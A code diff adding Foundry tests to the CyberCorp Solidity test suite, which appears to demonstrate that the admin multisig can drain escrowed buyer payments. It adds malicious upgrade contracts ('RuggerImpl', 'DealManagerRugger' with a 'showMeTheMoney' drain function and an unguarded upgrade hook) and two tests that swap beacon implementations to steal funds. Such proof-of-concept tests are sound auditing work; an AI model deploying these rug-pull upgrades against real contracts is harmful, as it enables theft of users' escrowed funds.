@@ -78,6 +78,26 @@ import {LeXcheXUtils} from "./libs/LeXcheXUtils.sol";
 import {Accreditation} from "../src/creds/storage/lexchexStorage.sol";
 import {RoundManagerFactory} from "../src/RoundManagerFactory.sol";
 import {ILegacyDealManagerFactory} from "../script/interfaces/ILegacyDealManagerFactory.sol";
+import {UUPSUpgradeable} from "openzeppelin-contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
+
+contract RuggerImpl {
+    function acceptDealManagerUpgrade(address dm, address newImpl) external {
+        DealManager(dm).upgradeToAndCall(newImpl, "");
+    }
+}
+
+contract DealManagerRugger is UUPSUpgradeable {
+    string public constant DEPLOY_VERSION = "ngmi";
+
+    function showMeTheMoney(address token) external {
+        IERC20(token).transfer(msg.sender, IERC20(token).balanceOf(address(this)));
+    }
+
+    // UUPS upgrade authorization
+    function _authorizeUpgrade(
+        address newImplementation
+    ) internal override {}
+}
 
 contract CyberCorpTest is Test {
     using ERC1967ProxyLib for address;
@@ -6144,5 +6164,208 @@ contract CyberCorpTest is Test {
         vm.prank(dealManagerAddr);
         CyberCertPrinter(certPrinter).transferFrom(dealManagerAddr, recipient, 0);
         assertEq(CyberCertPrinter(certPrinter).ownerOf(0), recipient);
+    }
+
+    function test_RugCyberCorpAfterPayment() public {
+        // Assume Base-sepolia
+        address paymentToken = 0x036CbD53842c5426634e7929541eC2318f3dCF7e;
+        uint256 paymentAmount = 1000000000000000000;
+        address cyberCorpSingleFactoryAddr = CyberCorpFactory(cyberCorpFactory).cyberCorpSingleFactory();
+        address dealManagerFactoryAddr = CyberCorpFactory(cyberCorpFactory).dealManagerFactory();
+
+        // Propose and have third-party pay a deal (not finalized yet so the funds are still in escrow)
+        address dealManagerAddr = _proposeDealAndPay(paymentToken, paymentAmount);
+
+        uint256 multisigBalanceBefore = IERC20(paymentToken).balanceOf(multisig);
+
+        vm.startPrank(multisig);
+
+        // Upgrade CyberCorp beacon to a corrupted implementation
+        address newCyberCorpImpl = address(new RuggerImpl());
+        CyberCorpSingleFactory(cyberCorpSingleFactoryAddr).upgradeImplementation(newCyberCorpImpl);
+
+        RuggerImpl corp = RuggerImpl(IIssuanceManager(DealManager(dealManagerAddr).issuanceManager()).CORP());
+
+        // Release corrupted DealManager
+        address dealManagerRuggerImpl = address(new DealManagerRugger());
+        DealManagerFactory(dealManagerFactoryAddr).setRefImplementation(dealManagerRuggerImpl);
+
+        // Use corrupted CyberCorp to accept corrupted DealManager release
+        corp.acceptDealManagerUpgrade(dealManagerAddr, dealManagerRuggerImpl);
+
+        // Profit(?)
+        DealManagerRugger(dealManagerAddr).showMeTheMoney(paymentToken);
+
+        vm.stopPrank();
+
+        assertEq(IERC20(paymentToken).balanceOf(multisig) - multisigBalanceBefore, paymentAmount, "should receive deal manager's token");
+    }
+
+    function test_RugIssuanceManagerAfterPayment() public {
+        // Assume Base-sepolia
+        address paymentToken = 0x036CbD53842c5426634e7929541eC2318f3dCF7e;
+        uint256 paymentAmount = 1000000000000000000;
+        address issuanceManagerFactoryAddr = CyberCorpFactory(cyberCorpFactory).issuanceManagerFactory();
+        address dealManagerFactoryAddr = CyberCorpFactory(cyberCorpFactory).dealManagerFactory();
+
+        // Propose and have third-party pay a deal (not finalized yet so the funds are still in escrow)
+        address dealManagerAddr = _proposeDealAndPay(paymentToken, paymentAmount);
+
+        uint256 multisigBalanceBefore = IERC20(paymentToken).balanceOf(multisig);
+
+        vm.startPrank(multisig);
+
+        // Upgrade IssuanceManager beacon to a corrupted implementation
+        address ruggerImpl = address(new RuggerImpl());
+        IssuanceManagerFactory(issuanceManagerFactoryAddr).upgradeImplementation(ruggerImpl);
+
+        RuggerImpl rugger = RuggerImpl(address(DealManager(dealManagerAddr).issuanceManager()));
+
+        // Release corrupted DealManager
+        address dealManagerRuggerImpl = address(new DealManagerRugger());
+        DealManagerFactory(dealManagerFactoryAddr).setRefImplementation(dealManagerRuggerImpl);
+
+        // Use corrupted IssuanceManager to accept corrupted DealManager release
+        rugger.acceptDealManagerUpgrade(dealManagerAddr, dealManagerRuggerImpl);
+
+        // Profit(?)
+        DealManagerRugger(dealManagerAddr).showMeTheMoney(paymentToken);
+
+        vm.stopPrank();
+
+        assertEq(IERC20(paymentToken).balanceOf(multisig) - multisigBalanceBefore, paymentAmount, "should receive deal manager's token");
+    }
+
+    function _proposeDealAndPay(address paymentToken, uint256 paymentAmount) internal returns (address dealManagerAddr) {
+        vm.startPrank(testAddress);
+        CertificateDetails[] memory _details = new CertificateDetails[](1);
+        CertificateDetails memory _detailsA = CertificateDetails({
+            signingOfficerName: "",
+            signingOfficerTitle: "",
+            investmentAmountUSD: 0,
+            issuerUSDValuationAtTimeOfInvestment: 10000000,
+            unitsRepresented: 0,
+            legalDetails: "Legal Details, jusidictione etc",
+            extensionData: ""
+        });
+        _details[0] = _detailsA;
+
+        CompanyOfficer memory officer = CompanyOfficer({
+            eoa: testAddress,
+            name: "Test Officer",
+            contact: "test@example.com",
+            title: "CEO"
+        });
+
+        string[] memory globalFields = new string[](1);
+        globalFields[0] = "Global Field 1";
+        string[] memory partyFields = new string[](1);
+        partyFields[0] = "Party Field 1";
+        string[] memory globalValues = new string[](1);
+        globalValues[0] = "Global Value 1";
+        address[] memory parties = new address[](2);
+        parties[0] = testAddress;
+        parties[1] = address(0);
+        string[][] memory partyValues = new string[][](1);
+        partyValues[0] = new string[](1);
+        partyValues[0][0] = "Party Value 1";
+
+        bytes32 contractId = keccak256(
+            abi.encode(
+                bytes32(uint256(1)),
+                block.timestamp,
+                globalValues,
+                parties
+            )
+        );
+
+        bytes memory signature = CyberAgreementUtils.signAgreementTypedData(
+            vm,
+            registry.DOMAIN_SEPARATOR(),
+            registry.SIGNATUREDATA_TYPEHASH(),
+            contractId,
+            "ipfs.io/ipfs/[cid]",
+            globalFields,
+            partyFields,
+            globalValues,
+            partyValues[0],
+            testPrivateKey
+        );
+
+        (
+            address cyberCorp,
+            address auth,
+            address issuanceManager,
+            address dealManagerAddr,
+            address roundManagerAddr,
+            address[] memory cyberCertPrinterAddr,
+            bytes32 id,
+            uint256[] memory certIds
+        ) = cyberCorpFactory.deployCyberCorpAndCreateOffer(
+            block.timestamp,
+            "CyberCorp",
+            "Limited Liability Company",
+            "Juris",
+            "Contact Details",
+            "Dispute Res",
+            testAddress,
+            officer,
+            certData,
+            bytes32(uint256(1)),
+            globalValues,
+            parties,
+            paymentAmount,
+            partyValues,
+            signature,
+            _details,
+            conditions,
+            bytes32(0),
+            block.timestamp + 1000000
+        );
+
+        // have a buyer sign and pay
+
+        uint256 newPartyPk = 80085;
+        address newPartyAddr = vm.addr(newPartyPk);
+        string[] memory partyValuesB = new string[](1);
+        partyValuesB[0] = "Party Value B";
+
+        vm.startPrank(newPartyAddr);
+        bytes memory newPartySignature = CyberAgreementUtils.signAgreementTypedData(
+            vm,
+            registry.DOMAIN_SEPARATOR(),
+            registry.SIGNATUREDATA_TYPEHASH(),
+            contractId,
+            "ipfs.io/ipfs/[cid]",
+            globalFields,
+            partyFields,
+            globalValues,
+            partyValuesB,
+            newPartyPk
+        );
+        deal(
+            paymentToken,
+            newPartyAddr,
+            paymentAmount
+        );
+        IERC20(paymentToken).approve(
+            address(dealManagerAddr),
+            paymentAmount
+        );
+
+        IDealManager(dealManagerAddr).signDealAndPay(
+            newPartyAddr,
+            id,
+            newPartySignature,
+            partyValuesB,
+            true,
+            "John Doe",
+            "passphrase"
+        );
+        vm.stopPrank();
+
+        assertEq(IERC20(paymentToken).balanceOf(dealManagerAddr), paymentAmount, "payment should be in escrow");
+
+        return dealManagerAddr;
     }
 }
